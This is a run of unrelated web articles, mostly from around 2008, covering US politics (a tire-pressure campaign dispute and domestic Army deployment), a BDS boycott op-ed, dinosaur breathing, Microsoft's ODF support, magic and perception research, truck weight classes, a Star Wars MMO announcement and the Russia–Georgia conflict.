Pawlenty a few minutes later pulled a prop out of his pocket .
“ Barack Obama stood up at a speech recently and said that one of the things that is really important from energy policy from his standpoint is to check the pressure in our tires , so here ’s a tire gauge and you can go out in the parking lot here and check your tires .
Now , that ’s an interesting thing — we want you to have good pressure in your tires , you know , it will very mildly add to your fuel efficiency — but checking the air pressure in your tires is not an energy policy for the United States of America , ” Pawlenty said .
ABC News ’
The Note added that tire gauges may get the Republican Party ’s message “ back on the road . ”
There ’s something deeply wrong with these people .
Let ’s review .
The other day , Barack Obama mentioned to voters in Missouri that there are things individuals can do to help conserve energy , including bringing their cars in for regular tune ups , and keeping their tires properly inflated .
It seemed like a rather unremarkable thing to say .
But at this point , Republicans can’t seem to stop commenting on just how remarkable they think this is .
To reiterate a point from yesterday , someone sent me a transcript yesterday of Obama ’s specific remarks in Missouri , and he apparently said the amount of energy to be saved by routine auto maintenance is comparable to the savings we ’d get from the GOP ’s coastal drilling policy .
I have no idea if that ’s true — it may very well not be — and I ’ll be happy to let energy policy experts weigh in on whether Obama exaggerated the significance of scheduled car care .
If he did , Obama should obviously drop this line from his speeches .
But oddly enough , that ’s not what McCain and his surrogates are complaining about .
They ’re insisting , over and over again , that tire pressure is the entire Obama energy policy .
Who , exactly , is supposed to believe such transparent nonsense ?
Consider a counter - example .
McCain was talking about skin cancer the other day .
McCain emphasized that skin cancer is preventable , and implored Americans to wear sunscreen , especially over the summer .
What ’s wrong with this advice ?
Not a thing .
It ’s a smart , sensible thing to say .
But imagine if Obama and his surrogates said the entirety of McCain ’s healthcare policy is sunscreen application .
McCain does n’t really care about cancer , they could argue , he just wants everyone to run out at get some SPF 30 .
Those vying to be Obama ’s running mate started holding up bottles of Coppertone during their speeches , saying things like , “ We want you to wear sunscreen , you know , it will very mildly improve your chances of not getting sick .
But wearing sunscreen is not a healthcare policy for the United States of America . ”
This , of course , would be insane .
And yet , that ’s pretty much what ’s become of Republican campaign rhetoric of late .
What ’s more , the estimable Bill Scher added some details that bolster Obama ’s point .
Obama was observing that coastal drilling would save us so little oil and so little money even twenty years from now , that you can actually save more money immediately by doing “ simple things ” such as keeping your tires properly inflated .
Where did he get that crazy idea ?
From George Bush ’s Energy Department and Environmental Protection Agency … .
Their joint site fueleconomy .gov is loaded with fuel - saving , money - saving tips .
Keep your tires properly inflated , for example , and you can save up to 12 cents a gallon .
Compare that immediate savings from that single tip , with what coastal and Arctic National Wildlife Refuge drilling combined would get you two decades from now : 6 cents a gallon .
And that ’s being generous , because Bush ’s Energy Department says we can’t expect any impact on prices from coastal drilling until the year 2030 .
In their knee - jerk mockery , conservatives are flying closer to the truth then they intend to .
Update : A friend reminds me that California Gov. Arnold Schwarzenegger ( R ) also recently “ appealed to those with the real power to make change — average citizens — to drive slower , keep engines tuned and tires properly inflated , to buy hybrids and lower overall consumption . ”
Second Update : Florida Gov. Charlie Crist also believes keeping tires inflated is important .
Third Update :
Not too long ago , NASCAR told fans , “ With escalating fuel prices , the time is now for drivers to focus on simple things like proper tire pressure to maximize tire performance and increase fuel economy . ”
It was unclear if the woman thought this was a new check - in method
An elderly Swedish woman tried to get herself on board an international flight by climbing onto an unmanned luggage belt after her suitcase .
The incident happened at Stockholm 's Arlanda airport .
The unnamed 78 - year - old thought she was just following instructions on how to check in for her flight .
She carefully lay down on the conveyor belt and was whisked into the baggage handling bay where she was rescued by surprised staff .
" It was a bit unfortunate , " said Ari Kallonen of baggage handling firm Nordic Aero .
" The little old lady arrived at the airport and had to take care of herself .
" Unfortunately , she did not understand when she was given check - in instructions .
She took the belt together with her bag .
Luckily it was n't a long ride - only a couple of metres . "
The woman did not reportedly suffer any injuries , managing to catch her flight to Germany , police said .
The airport does provide a service , on request , to help guide elderly or vulnerable people through the departures process .

Why a Cultural Boycott is Necessary
By Remi Kanazi
At what point does rhetoric stop and effective action begin ?
For Palestinians , decades of dialogue and supposed peace overtures have proved fruitless , only serving to protect the status quo : sixty years of continual dispossession , forty years of occupation , and a systematic repudiation of international and humanitarian law .
The situation for Palestinians will not improve without constructive movement forward — which rejects collusion with the Israeli government by exercising boycott , divestment and sanctions ( known as BDS ) .
During the 1980’s , BDS of South Africa included a cultural boycott whereby musicians and artists from around the world were prohibited from performing in the apartheid state .
In addition to internationally supporting the subjugated black population , this policy was instituted to express that no real dialogue — economic , academic , or cultural — could take place in concert with the atrocities of apartheid .
With regard to Israel , the implementation of international BDS is but one necessary measure to shift the balance away from the oppressor and help place it in the hands of the oppressed .
It is imperative to note that a cultural boycott is not aimed at individuals , but rather institutions and a state .
Frequently , Israelis travel the world and speak out against their nation ’s policies , and many support a full cultural and academic boycott .
A cultural boycott does not hinder the prospects for peace ; rather it serves to empower conscientious Israelis and Palestinians , and provides the international community with a viable non-violent solution to the current impasse .
After traveling to the occupied Palestinian territories , a host of individuals have asserted that Israeli occupation is in fact worse than South African apartheid .
Among these people are highly esteemed anti-apartheid advocate Archbishop Desmond Tutu and Jewish South African Minister of Intelligence Ronnie Kasrils .
In an effort to pressure Israel to abort its destructive policies , both argue that the international community should impose a boycott on Israel , analogous to the one imposed on South Africa .
Many organizations and individuals have voiced opposition to an academic and cultural boycott .
Their contention is that the arts and academic community in Israel will be denied the basic tenets of free speech .
Ironically , the proposed model asserts that people of conscience , including conscious Israelis , are ostensibly encouraged to embrace “ free speech ” and “ dialogue ” over the most basic rights of an oppressed people .
What remains missing from their argument is the fact that the Palestinian people have been methodically occupied , controlled , and embargoed by the Israeli government and many Israeli institutions for decades — with no effective recourse taken by the United Nations , European Union , or United States .
Just this week , the Associated Press reported that seven Palestinians from occupied Gaza were denied exit visas to “ pursue their Fulbright scholarship studies ” by the Israeli government .
While their Fulbrights were reinstated after the AP article circulated , and the US State Department is now purportedly “ trying ” to get Israel to change its position , the vast majority of these incidents go unnoticed .
There are countless other stories of hip hop artists , theater groups , and debke troupes not being able to travel to the West Bank from Gaza , and vice versa , never mind exiting the prison walls of the Occupied Territories .
Moreover , one cannot downplay the multitude of instances where Palestinians — using means of non-violent protest — have been arrested , beaten , or shot by Israeli soldiers .
Sadly , many of these detracting groups and individuals in Israel calling for “ dialogue ” based on “ dual narratives ” cannot be seen at any of the non-violent protests against the apartheid wall or part of the growing list of Israeli soldiers refusing to serve in the army .
Onlookers in the so - called “ left ” in the US incessantly opine about the need for Palestinians to assert themselves non-violently — yet when Palestinians and their supporters embrace a fundamental tool of non-violent resistance , they are castigated .
Furthermore , those in a position to boycott must recognize the effects of Israel ’s policies on the 1.3 million Palestinian citizens of Israel who have become relegated to third class status and have seen their own art and film community attacked by Israel ’s discriminatory legal system .
If the Israeli people and those in the international community truly want to stand in solidarity with the Palestinian people , they will embrace what more than sixty Palestinian academic , cultural and civil society organizations have endorsed : a full academic and cultural boycott of the state of Israel .
Throughout the Oslo years , the purported time of peace , endless cultural dialogue took place .
But as Omar Barghouti — dance choreographer , activist , and ardent sponsor of a cultural boycott — contends , “ A decade of joint Palestinian - Israeli projects mostly resulted in providing a figleaf , covering up Israel ’s relentless colonization of Palestinian land and its crimes against the Palestinian people . ”
It is clear that even cultural dialogue with the Israeli establishment has only proven to normalize the occupation .
Tutu once declared , “ If you are neutral in situations of injustice , you have chosen the side of the oppressor . ”
Now is not the time to be neutral , nor the time to be reticent ; it is the time to act .

Man continues quest to depose Dick Cheney
DENVER ( AP ) - A man suing the Secret Service for his arrest for an alleged assault on the vice president has renewed his attempt to subpoena Dick Cheney so he can tell a judge what happened .
Steven Howards says the Secret Service agents wrongfully arrested him two years ago for walking up to Cheney at a mall and telling him his policies in Iraq were " disgusting . "
A judge ruled against Howards ' motion to subpoena Cheney in April .
Howards ' attorney David Lane says in his motion Monday the federal judge told them they could renew their request if they obtained additional evidence from other sources .
Lane says Cheney is " the best eyewitness to the case . "
Cheney spokeswoman Lea Foster says she can't comment on pending litigation .
Several bloggers today have pointed to this obviously disturbing article from Army Times , which announces that “ beginning Oct. 1 for 12 months , the [ 1st Brigade Combat Team of the 3rd Infantry Division ] will be under the day - to - day control of U.S. Army North ” — “ the first time an active unit has been given a dedicated assignment to NorthCom , a joint command established in 2002 to provide command and control for federal homeland defense efforts and coordinate defense support of civil authorities . ”
The article details :
They ’ll learn new skills , use some of the ones they acquired in the war zone and more than likely will not be shot at while doing any of it .
They may be called upon to help with civil unrest and crowd control or to deal with potentially horrific scenarios such as massive poisoning and chaos in response to a chemical , biological , radiological , nuclear or high - yield explosive , or CBRNE , attack .
. . .
The 1st BCT ’s soldiers also will learn how to use “ the first ever nonlethal package that the Army has fielded , ” 1st BCT commander Col .
Roger Cloutier said , referring to crowd and traffic control equipment and nonlethal weapons designed to subdue unruly or dangerous individuals without killing them .
“ It ’s a new modular package of nonlethal capabilities that they ’re fielding .
They ’ve been using pieces of it in Iraq , but this is the first time that these modules were consolidated and this package fielded , and because of this mission we ’re undertaking we were the first to get it . ”
The package includes equipment to stand up a hasty road block ; spike strips for slowing , stopping or controlling traffic ; shields and batons ; and , beanbag bullets .
“ I was the first guy in the brigade to get Tasered , ” said Cloutier , describing the experience as “ your worst muscle cramp ever — times 10 throughout your whole body ” .
. . .
The brigade will not change its name , but the force will be known for the next year as a CBRNE Consequence Management Response Force , or CCMRF ( pronounced “ sea- smurf ” ) .
For more than 100 years — since the end of the Civil War — deployment of the U.S. military inside the U.S. has been prohibited under The Posse Comitatus Act ( the only exceptions being that the National Guard and Coast Guard are exempted , and use of the military on an emergency ad hoc basis is permitted , such as what happened after Hurricane Katrina ) .
Though there have been some erosions of this prohibition over the last several decades ( most perniciously to allow the use of the military to work with law enforcement agencies in the “ War on Drugs ” ) , the bright line ban on using the U.S. military as a standing law enforcement force inside the U.S. has been more or less honored — until now .
And as the Army Times notes , once this particular brigade completes its one - year assignment , “ expectations are that another , as yet unnamed , active - duty brigade will take over and that the mission will be a permanent one . ”
After Hurricane Katrina , the Bush administration began openly agitating for what would be , in essence , a complete elimination of the key prohibitions of the Posse Comitatus Act in order to allow the President to deploy U.S. military forces inside the U.S. basically at will — and , as usual , they were successful as a result of rapid bipartisan compliance with the Leader ’s demand ( the same kind of compliance that is about to foist a bailout package on the nation ) .
This April , 2007 article by James Bovard in The American Conservative detailed the now - familiar mechanics that led to the destruction of this particular long - standing democratic safeguard :
The Defense Authorization Act of 2006 , passed on Sept. 30 , empowers President George W. Bush to impose martial law in the event of a terrorist “ incident , ” if he or other federal officials perceive a shortfall of “ public order , ” or even in response to antiwar protests that get unruly as a result of government provocations .
. . .
It only took a few paragraphs in a $ 500 billion , 591 - page bill to raze one of the most important limits on federal power .
Congress passed the Insurrection Act in 1807 to severely restrict the president ’s ability to deploy the military within the United States .
The Posse Comitatus Act of 1878 tightened these restrictions , imposing a two - year prison sentence on anyone who used the military within the U.S. without the express permission of Congress .
But there is a loophole : Posse Comitatus is waived if the president invokes the Insurrection Act. Section 1076 of the John Warner National Defense Authorization
Act for Fiscal Year 2007 changed the name of the key provision in the statute book from “ Insurrection Act ” to “ Enforcement of the Laws to Restore Public Order Act . ”
The Insurrection Act of 1807 stated that the president could deploy troops within the United States only “ to suppress , in a State , any insurrection , domestic violence , unlawful combination , or conspiracy . ”
The new law expands the list to include “ natural disaster , epidemic , or other serious public health emergency , terrorist attack or incident , or other condition ” — and such “ condition ” is not defined or limited .
. . .
The story of how Section 1076 became law vivifies how expanding government power is almost always the correct answer in Washington .
Some people have claimed the provision was slipped into the bill in the middle of the night .
In reality , the administration clearly signaled its intent and almost no one in the media or Congress tried to stop it . . . .
Section 1076 was supported by both conservatives and liberals .
Sen. Carl Levin ( D - Mich . ) , the ranking Democratic member on the Senate Armed Services Committee , co-wrote the provision along with committee chairman Sen. John Warner ( R - Va . ) .
Sen .
Ted Kennedy openly endorsed it , and Rep. Duncan Hunter ( R - Calif. ) , then - chairman of the House Armed Services Committee , was an avid proponent .
. . .
Sen. Patrick Leahy ( D - Vt. ) , the ranking Democrat on the Senate Judiciary Committee , warned on Sept. 19 that “ we certainly do not need to make it easier for Presidents to declare martial law , ” but his alarm got no response .
Ten days later , he commented in the Congressional Record : “ Using the military for law enforcement goes against one of the founding tenets of our democracy . ”
Leahy further condemned the process , declaring that it “ was just slipped in the defense bill as a rider with little study .
Other congressional committees with jurisdiction over these matters had no chance to comment , let alone hold hearings on , these proposals . ”
As is typical , very few members of the media even mentioned any of this , let alone discussed it ( and I failed to give this the attention it deserved at the time ) , but Congressional Quarterly ‘s Jeff Stein wrote an excellent article at the time detailing the process and noted that “ despite such a radical turn , the new law garnered little dissent , or even attention , on the Hill . ”
Stein also noted that while “ the blogosphere , of course , was all over it . . . a search of The Washington Post and New York Times archives , using the terms ‘ Insurrection Act , ’ ‘ martial law ’ and ‘ Congress , ’ came up empty . ”
Bovard and Stein both noted that every Governor — including Republicans — joined in Leahy ’s objections , as they perceived it as a threat from the Federal Government to what has long been the role of the National Guard .
But those concerns were easily brushed aside by the bipartisan majorities in Congress , eager — as always — to grant the President this radical new power .
The decision this month to permanently deploy a U.S. Army brigade inside the U.S. for purely domestic law enforcement purposes is the fruit of the Congressional elimination of the long - standing prohibitions in Posse Comitatus ( although there are credible signs that even before Congress acted , the Bush administration secretly decided it possessed the inherent power to violate the Act ) .
It should n’t take any efforts to explain why the permanent deployment of the U.S. military inside American cities , acting as the President ’s police force , is so disturbing .
Bovard :
“ Martial law ” is a euphemism for military dictatorship .
When foreign democracies are overthrown and a junta establishes martial law , Americans usually recognize that a fundamental change has occurred .
. . .
Section 1076 is Enabling
Act - type legislation — something that purports to preserve law - and - order while formally empowering the president to rule by decree .
The historic importance of the Posse Comitatus prohibition was also well - analyzed here .
As the recent militarization of St. Paul during the GOP Convention made abundantly clear , our actual police forces are already quite militarized .
Still , what possible rationale is there for permanently deploying the U.S. Army inside the United States — under the command of the President — for any purpose , let alone things such as “ crowd control , ” other traditional law enforcement functions , and a seemingly unlimited array of other uses at the President ’s sole discretion ?
And where are all of the stalwart right - wing “ small government conservatives ” who spent the 1990s so vocally opposing every aspect of the growing federal police force ?
And would it be possible to get some explanation from the Government about what the rationale is for this unprecedented domestic military deployment ( at least unprecedented since the Civil War ) , and why it is being undertaken now ?
UPDATE : As this commenter notes , the 2008 National Defense Authorization
Act somewhat limited the scope of the powers granted by the 2007 Act detailed above ( mostly to address constitutional concerns by limiting the President ’s powers to deploy the military to suppress disorder that threatens constitutional rights ) , but President Bush , when signing that 2008 Act into law , issued a signing statement which , though vague , seems to declare that he does not recognize those new limitations .
UPDATE II : There ’s no need to start manufacturing all sorts of scare scenarios about Bush canceling elections or the imminent declaration of martial law or anything of that sort .
None of that is going to happen with a single brigade and it ’s unlikely in the extreme that they ’d be announcing these deployments if they had activated any such plans .
The point is that the deployment is a very dangerous precedent , quite possibly illegal , and a radical abandonment of an important democratic safeguard .
As always with first steps of this sort , the danger lies in how the power can be abused in the future .

This flesh rendering of the predator Aerosteon shows its lungs ( red ) and air sacs ( other colors ) as they might have been in life about 85 million years ago .
A huge carnivorous dinosaur that lived about 85 million years ago had a breathing system much like that of today 's birds , a new analysis of fossils reveals , reinforcing the evolutionary link between dinos and modern birds .
The finding sheds light on the transition between theropods ( a group of two - legged carnivorous dinosaurs ) and the emergence of birds .
Scientists think birds evolved from a group of theropods called maniraptors , some 150 million years ago during the Jurassic period , which lasted from about 206 million to 144 million years ago .
" It 's another piece of evidence that 's piling onto the list of things that link birds with dinosaurs , " said researcher Jeffrey Wilson , a paleontologist at the University of Michigan .
Flighty dinosaur
Called Aerosteon riocoloradensis , the bipedal dinosaur would have stood at about 8 feet ( 2.5 meters ) at its hips with a body length of 30 feet ( 9 meters ) , about the length of a school bus .
Wilson along with University of Chicago paleontologist Paul Sereno and others discovered the skeletal remains of A. riocoloradensis during a 1996 expedition to Argentina .
In years following the discovery , the scientists cleaned up the bones and scanned them with computed tomography .
The scans showed small openings in the vertebrae , clavicles ( chest bone that forms the wishbone ) and hip bones that led into large , hollow spaces .
When the dinosaur lived , the hollow spaces would have been lined with soft tissue and filled with air .
These chambers resembled such features found in the same bones of modern birds .
While there 's no evidence to suggest the dinosaur wore a coat of feathers or flew like a bird when alive , the new findings suggest it breathed like one .
Modern birds have rigid lungs that do n't expand and contract like ours .
Instead , a system of air sacs pumps air through the lungs .
This novel feature is the reason birds can fly higher and faster than bats , which , like all mammals , expand their lungs in a less efficient breathing process .
Other avian air sacs line the spinal column and are thought to lighten birds ' skeletal bones , also making flight easier .
" We 're beginning to learn more about how the specialized respiratory system of the birds evolved by tracing some of the steps in their ancient relatives , " Wilson told LiveScience .
" And the cool thing is these animals look nothing like birds . "
Lighten the load
Wilson and his colleagues suggest the hollow bones and possible air sacs could have served various purposes , such as making the dinosaurs efficient breathers .
Weighing as much as an elephant , Aerosteon also may have used the openings to shuttle away unwanted heat from its body core , Wilson said .
Another advantage of airy bones would be to shed some pounds from the leviathon .
" It may have an important functional role in making the backbone light but also strong , " Wilson said of the air - sac system .
" When you get big , weight is important . "
Several dinosaur fossils have shown suites of bird - like features , though no carnivorous dino has been found with such evidence of air sacs in its clavicle .
For instance , past research has shown maniraptoran dinosaurs , such as velicoraptors and tyrannosaurs , were equipped with structures that move the ribs and sternum during breathing in modern birds .
Scientists also have found air sacs in the vertebrae of sauropods , a group of long - necked , long - tailed , plant - eating dinosaurs that lived in the Late Triassic and Middle Jurassic periods , about 180 million years ago .
The clavicle discovery is detailed today in the online journal PLoS ONE .
OOXML support is delayed , and it cannot affort to be kicked out of those ( government ) accounts that require the use of an ISO standard .
So it bites the bullet and implements ' that other ' standard , just to stay in those accounts .
Since nobody has seen their implementation yet ( and wo n't be able to do so for a long time ) , there is some speculation that Microsoft will somehow cripple the ODF support .
This would mean it follows the ISO standard requirement on paper , but in practice people will find it cumbersome to work with and thus will just continue to save in .doc format .
Along the line of ( 1 ) and ( 2 ) , by announcing ODF support now , they can possibly prevent organisations from seriously considering a move to OpenOffice for the time being .
People will be hesitant to spend resources on re-training and even though ODF support in Office is still ways out , they now have a reason to hold on to Office for the time being .
If they have gone the route of ( 2 ) then enough time will have passed so that we will be closer to OOXML support in Office .
By the time those hold - outs have noticed that the ODF support may be crippled , they will then not have to wait that much longer for OOXML and thus can continue to stick with MS Office .
Microsoft does n't need to zealously guard file formats anymore .
It already owns the next few decades of lock - in , and many enterprises are willy - nilly dumping their content into Microsoft 's proprietary repository at a pace and in a manner that is as potentially destructive for those enterprises as it is beneficial to Microsoft 's income .
... if Microsoft really wants to do its customers a favor , it will open up its repository to make it as easy to get content out of the repository as it is to get it into the repository .
A rather remarkable piece of news : Microsoft will support the ODF standard in its Office suite Microsoft press release )
This feature will come along in a service pack , which is expected to be released in the first half of 2009 .
So , nothing immediate , but still .
An interesting discussion about this is currently going on over at Slashdot .
What 's really noteworthy is that apparently the support for ODF will be available before (! ) support for OOXML is delivered .
In light of all this - and Microsoft 's long history in fighting open standards - there are a number of theories as to why Microsoft is now doing this : I also have to wonder how well ODF will be supported in other Microsoft products .
People like the Microsoft suite of products because of its good integration .
They do n't want bits and pieces .
So , if the remainder of the usual Microsoft infrastructure does n't have good ODF support as well , people will still not use it much .
Speaking of SharePoint , here is a very different view on this all .
According to that article , the actual document format does n't matter so much to Microsoft anymore , since it moved vendor lock - in to the level above the files :
The actual repository in which the information is kept .
In this case : SharePoint : But not everyone is using SharePoint just yet .
As pointed out by various commentators , this supporting ODF is also a danger for Microsoft :
Once people have started to store documents in ODF , they eventually have to wonder why they do n't just use OpenOffice instead .
Pay for training once , and never pay for license fees again .
Since the ODF ISO - standard will be available in Office before the OOXML ISO -' standard ' , those accounts that mandate standard formats are particularly threatened by this .
In the end , we will have to see what Microsoft 's long term strategy is with ODF support in Office .
It could be quite a gamble , though :
To protect their short - term position , they may have opened the door to an alternative Office solution and possibly may have weakend themselves in the long - term .
Time will tell .

In September of 1856 , in the face of a growing rebellion , Napoleon III dispatched Jean - Eugene Robert - Houdin to Algeria .
Robert - Houdin was not a general , nor a diplomat .
He was a magician - the father , by most accounts , of modern magic .
( A promising young escape artist named Ehrich Weiss would , a few decades later , choose his stage name by adding an " i " to " Houdin . " )
His mission was to counter the Algerian marabouts , conjurers whose artful wizardry had helped convince the Algerian populace of Allah 's displeasure with French rule .
A French colonial official assembled an audience of Arab chieftains , and Robert - Houdin put on a show that , in its broadest outlines , would be familiar to today 's audiences : he pulled cannonballs out of his hat , he plucked lit candelabra out of the air , he poured gallon upon gallon of coffee out of an empty silver bowl .
Then , as he recounted in his memoirs , Robert - Houdin launched into a piece of enchantment calculated to cow the chieftains .
He had a small wooden chest with a metal handle brought onto the stage .
He picked a well - muscled member of the audience and asked him to lift the box ; the man did it easily .
Then Robert - Houdin announced , with a menacing wave of his hand , that he had sapped the man 's strength .
When the volunteer again took hold of the box , it would not budge - an assistant to Robert - Houdin had activated a powerful magnet in the floor of the stage .
The volunteer heaved at the box , his frustration shading into desperation until Robert - Houdin 's assistant , at a second signal , sent an electric shock through the handle , driving the man screaming from the stage .
The chieftains were duly impressed , and the rebellion quelled .
The story of Robert - Houdin 's diplomacy by legerdemain is well - established in magic lore , in large part because it is the only documented instance , at least since antiquity , in which a conjurer changed the course of world affairs .
Stage magic , after all , is n't statecraft , but spectacle and entertainment .
In the past year , though , a few researchers have begun to realize that magic represents something more : a deep and untapped store of knowledge about the human mind .
At a major conference last year in Las Vegas , in a scientific paper published last week and another due out this week , psychologists have argued that magicians , in their age - old quest for better ways to fool people , have been engaging in cutting - edge , if informal , research into how we see and comprehend the world around us .
Just as studying the mechanisms of disease reveals the workings of our body 's defenses , these psychologists believe that studying the ways a talented magician can short - circuit our perceptual system will allow us to better grasp how the system is put together .
" I think magicians and cognitive neuroscientists are getting at similar questions , but while neuroscientists have been looking at this for a few decades , magicians have been looking at this for centuries , millennia probably , " says Susana Martinez - Conde , a neuroscientist at the Barrow Neurological Institute and coauthor of one of the studies , published online last week in Nature Reviews Neuroscience .
" What magicians do is light - years ahead in terms of sophistication and the power of these techniques . "
As magicians have long known and neuroscientists are increasingly discovering , human perception is a jury - rigged apparatus , full of gaps and easily manipulated .
The collaboration between science and magic is still young , and the findings preliminary , but interest among scholars is only growing : the New York Academy of Science has invited the magician Apollo Robbins to give a presentation in January on the science of vision , and a team of magicians is scheduled to speak at next year 's annual meeting of the Society for Neuroscience , the world 's largest organization of brain researchers .
And in a world where concentration is a scarce resource , a better understanding of how to channel it would have myriad uses , from safer dashboard displays to more alluring advertisements - and even , perhaps , to better magic .
BREAK
A great deal of the success of a piece of magic is simply getting the audience 's attention and sending it to the wrong place - to a right hand flourishing a wand while the left secrets a ball away in a pocket or plucks a card from a sleeve .
Magic shows are masterpieces of misdirection : they assault us with bright colors and shiny things , with puffs of smoke and with the constant obfuscatory patter that many magicians keep up as they perform .
For years , cognitive scientists thought of perception as like a movie camera , something that reproduced the world in its panoply of detail .
Over the past decade , though , that model has been increasingly questioned .
For one thing , people have a pronounced tendency to miss things that are happening right in front of them .
Daniel Simons , a psychologist at the University of Illinois , did a series of now - famous studies in the late 1990s that showed the extent of this cognitive blindness .
In one , people were approached by someone asking them for directions , only to have , in the middle of the conversation , that person replaced by another .
Only half noticed the change .
In another study , people were shown a movie clip of two teams , one in black shirts and one in white , each passing a basketball around .
The subjects were asked to count the number of passes one of the teams made .
Half said afterward that they had n't noticed the woman in a gorilla suit who , midway through the clip , strolled through , paused , and beat her chest .
Because of work like this , a new model has arisen over the past decade , in which visual cognition is understood not as a camera but something more like a flashlight beam sweeping a twilit landscape .
At any particular instant , we can only see detail and color in the small patch we are concentrating on .
The rest we fill in through a combination of memory , prediction and a crude peripheral sight .
We do n't take in our surroundings so much as actively and constantly construct them .
" Our picture of the world is kind of a virtual reality , " says Ronald A. Rensink , a professor of computer science and psychology at the University of British Columbia and coauthor of a paper on magic and psychology that will be published online this week in Trends in Cognitive Sciences .
" It 's a form of intelligent hallucination . "
The benefit of these sorts of cognitive shortcuts is that they allow us to create a remarkably rich image of our environment despite the fact that our two optic nerves have roughly the resolution of cell - phone cameras .
We do n't have to , for example , waste time making out every car on the highway to understand that they are , indeed , cars , and to make sense of how they are moving - our minds can simply approximate from the thousands of cars we have already seen in our lives .
But because this method relies so heavily on expectation - not only to fill in the backdrop around us but to determine where to send what psychologists call our " attentional spotlight " - we are especially vulnerable to someone who knows our expectations and can manipulate them , someone like a magician .
" In magic , " says Teller , half of the well - known duo Penn & Teller and one of five magicians credited as coauthors of the Nature Reviews Neuroscience paper , " we tend to take the things that make us smart as human beings and turn those against us . "
Misdirection is , in a sense , the conjurer 's tool that is easiest to understand - we miss things simply because we are n't looking at them .
Martinez - Conde is particularly interested in misdirection , and the question of what it is about certain movements that attract and hold our attention .
Robbins , a performing pickpocket and another of the magicians to coauthor the Nature Neuroscience paper , has found , he says , that semi- circular gestures draw people 's attention better than straight ones .
" It engages them more , " he says .
" I use them when I 'm actually coming out of the pocket . "
Martinez - Conde is intrigued by this distinction , and has hypothesized that the particular magnetism of curved motions might spring from the fact that they do n't map as easily onto the quick , straight movements , or saccades , that our eyes instinctively use to focus on objects .
As a result , she suggests , curved motions might require more sustained attention and concentration to follow .
America is dependent on trucks moving food and goods across the country .
Without them , most grocery stores would run out of food in three days .
In 2017 , these commercial trucks moved 10.8 billion tons of freight .
It takes several different classification truck types to move freight .
The commercial truck classification is determined by their gross vehicle weight rating ( GVWR ) .
This article is going to explain the GVWR and everything you need to know about classifying commercial trucks .
What Is Commercial Truck Classification ?
Commercial vehicle classes are weight categories .
The vehicle ’s GVWR is a combination of the vehicle ’s total weight ( including fuel and fluids ) and its total cargo carrying capacity .
Class 1 : 0 -6,000 lbs .
Class 2 : 6,001 - 10,000 lbs .
Class 3 : 10,001 - 14,000 lbs .
Class 4 : 14,001 - 16,000 lbs .
Class 5 : 16,001 - 19,500 lbs .
Class 6 : 19,501 - 26,000 lbs .
Class 7 : 26,001 - 33,000 lbs .
Class 8 : 33,000 lbs.+
If a truck falls into the first three classes , then it ’s considered a light truck .
Classes four through six are medium trucks .
Part of class six through class eight are heavy - duty trucks .
Purpose of Classifications of Commercial Trucks
Classifying commercial vehicles can allow for the regulation of these vehicles , which can improve their safety .
It also allows for the classification of the vehicles by industry and purpose .
Finally , it aids in the registration of these vehicles when an owner wants to begin using a new one .
What Counts as a Commercial Vehicle ?
The term “ commercial vehicle ” is a broad one that can refer to anything from a company car or other business use vehicle to a large semi-truck .
Typically , any vehicle that ’s designed to carry more than 15 passengers is automatically considered a commercial vehicle .
Also , any vehicle that has a weight rating of at least 26,001 is automatically considered a commercial vehicle .
Light Trucks
These lightweight vehicles can be a consumer car , truck , SUV , or minivan .
The difference is the purpose the vehicle is used for .
At the larger end in class three , you ’ll see some larger vehicles , such as a city delivery box truck or walk - in truck ( such as a UPS or FedEx truck ) .
Commercial vehicles that have a GVWR of 10,001 pounds or over must comply with federal and state safety regulations .
They must also stop at highway weight and inspection stations .
Medium Trucks
The vehicles in the middleweight category are typically manufactured with a specific commercial purpose in mind .
These vehicles include larger city delivery or walk - in trucks , landscaping utility trucks , a school bus , or a utility bucket truck .
Heavy Trucks
Up until this category , drivers did not need a CDL to operate the commercial vehicle .
Once you get to class seven and eight , you ’ll need to obtain one to legally operate the truck .
The vehicles that are in these two categories consist of the largest of the commercial vehicles on the road .
City transit bus
Tow truck
Garbage truck
Tour bus
Semi-trucks
Dump trucks
Cement mixer
Firetruck
Commercial Truck Classification Demystified
Understanding the different commercial truck classification types can help you select the right vehicle for your supply chain needs .
As you can see , the different types of vehicles perform best for their given purpose .
Knowing the varying regulations for the different classifications will also ensure you stay compliant with state and federal regulations .

It ’s a big day for Bioware .
First , Dragon
Age scrubs up very nice indeed , and now EA have only bleedin’ gone and revealed they ’re planning Star Wars : Knights of the Old Republic : The MMO .
Yes , with Bioware at the till .
[ Pauses for internet - wide cheer ] .
“ As if millions of voices suddenly cried out in rapture and were suddenly fanboys … ”
It ’s been rumoured for ages , but E3 saw EA ’s John Riccitiello drop a conclusive bombshell .
Quote ’n ’ that under the jump .
I ’ve said it before and I ’ll say it again – I ’d better be able to play as a Jawa .
“ We ’ve got two of the most compelling MMOs in the industry in development , ” said Riccitiello .
The first title , based on the Warhammer property , will launch soon .
“ And the one that people are dying for us to talk to them about — in partnership with Lucas , coming out of BioWare , which is , I think , quite possibly the most anticipated game , full stop , for the industry at the point when we get closer to telling you about it . ”
Does Riccitiello mean the oft rumored Knights of the Old Republic Online ?
“ Yes , ” he said .
( From Portfolio via VG247 ) .
“ Yes ” can be such a magical word .
In a way , the Bioware involvement is in many ways the least important element of this .
It ’s a certain seal of quality , sure – and crucially it ’s the first time they ’ve done Massively Multi – but what ’s really big here is that it ’s a Star Wars MMO .
From EA .
In a post - WoW climate ( which puts it on an entirely different footing to poor Galaxies right from the off ) .
In other words , perhaps the most serious rival World of Warcraft could possibly have .
We ’ll be needing to hear your name suggestions now , please .
The United States has warned Russia its military operations in Georgia risk seriously damaging relations between Washington and Moscow for years .
Speaking to reporters about the delivery of humanitarian aid to Georgia , Robert Gates , the US defence secretary , said : " If Russia does not step back from its aggressive posture and actions in Georgia , the US - Russian relationship could be adversely affected for years to come . "
The US secretary of state , Condoleezza Rice , has also stepped up pressure on Moscow , issuing another urgent call for Russia to honour the ceasefire with Georgia .
She met with the French president , Nicolas Sarkozy , this afternoon to discuss the situation and will travel to Tbilisi tomorrow to have the peace agreement signed by the Georgian president .
" We would hope that he would be true to his word , " Rice said , of the Russian president , Dmitri Medvedev .
" The provisional ceasefire that was agreed to really must go into place .
And that means that military activities have to cease . "
There are reports of continued fighting in parts of Georgia .
Ban Ki-moon , the United Nations secretary general , said humanitarian aid groups and UN monitors were struggling to reach civilians caught up in the conflict because of ongoing fighting and lawlessness .
